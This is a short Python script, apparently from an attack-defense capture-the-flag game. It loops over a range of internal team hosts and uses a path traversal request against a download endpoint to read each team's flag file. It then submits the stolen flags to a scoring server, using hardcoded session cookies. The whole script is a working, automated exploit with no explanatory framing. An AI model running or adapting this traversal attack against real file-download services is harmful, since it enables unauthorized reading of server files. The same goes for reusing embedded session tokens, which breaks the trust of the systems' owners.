import requests
import flag_shooter
import flag_manager

def attack():
    cookies = {
        'session': 'eyJ0ZWFtX2lkeCI6MX0.Y7_-KQ.-HgRrXK0SVI-UwIjSBWIi5yqPG8',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'session=eyJ0ZWFtX2lkeCI6MX0.Y7_-KQ.-HgRrXK0SVI-UwIjSBWIi5yqPG8',
        'Origin': 'http://15.165.15.245',
        'Referer': 'http://15.165.15.245/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
    }

    data = 'flag=여기채우면됨~~'.encode()
    round = flag_manager.get_round()
    for i in range(2,17):
        try:
            URL = 'http://10.10.1.'
            URL += str(i)
            URL += ':30001/download?filenameRMFO=flag.txt&filepath=../../../../../../../../flag/flag.txt'
            response = requests.get(URL, cookies=cookies, headers=headers, data=data, verify=False, timeout=3)
            #print(response.text)
            
            flag = response.text
            
            
            session = "eyJ0ZWFtX2lkeCI6MX0.Y8Cfgg.zgqLfuvqkANsT1MTDvPBeeFtGos",
            
            flag_shooter.auth("http://3.38.255.21", flag, session)
            #flag_manager.flag_manager(1, round, "10.10.1."+str(i), flag)
        except KeyboardInterrupt:
            exit()
        except requests.Timeout:
            continue
        except:
            continue
        

def main():
    attack()

if __name__ == "__main__":
    main()